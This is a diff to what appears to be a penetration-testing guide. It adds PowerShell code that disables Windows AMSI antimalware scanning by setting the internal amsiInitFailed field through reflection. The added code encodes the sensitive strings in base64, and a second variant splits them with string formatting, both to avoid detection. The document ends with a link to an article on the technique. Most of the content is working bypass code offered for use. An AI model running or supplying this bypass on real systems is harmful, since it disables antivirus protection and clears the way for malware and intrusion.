@@ -181,10 +181,12 @@ String2 = amsiInitFailed
 ```powershell
 $b64String1 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("System.Management.Automation.AmsiUtils"))
 $b64String2 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("amsiInitFailed"))
+$b64String3 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("NonPublic,Static"))
 ```
 
 > ***String1 =>*** "UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzAA=="
 > ***String2 =>*** "YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=="
+> ***String3 =>*** "TgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA="
 
 ![image](./images/amsi_b64.jpg)
 
@@ -193,7 +195,20 @@ Now let's write the script used the b64 encoded strings and decode them into a n
 ```powershell
 $b64String1 = "UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzAA=="
 $b64string2 = "YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=="
+$b64String3 = "TgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA="
 $string1 = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($b64String1))
 $String2 = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($b64String2))
-[Ref].Assembly.GetType($string1).GetField($string2,'NonPublic,Static').SetValue($null,$true)
+$String3 = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($b64String3))
+[Ref].Assembly.GetType($string1).GetField($string2,$string3).SetValue($null,$true)
 ```
+
+Los er door:
+
+```powershell
+$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'
+$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
+$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
+$field.SetValue($null,$true)
+```
+
+https://medium.com/@sam.rothlisberger/amsi-bypass-memory-patch-technique-in-2024-f5560022752b
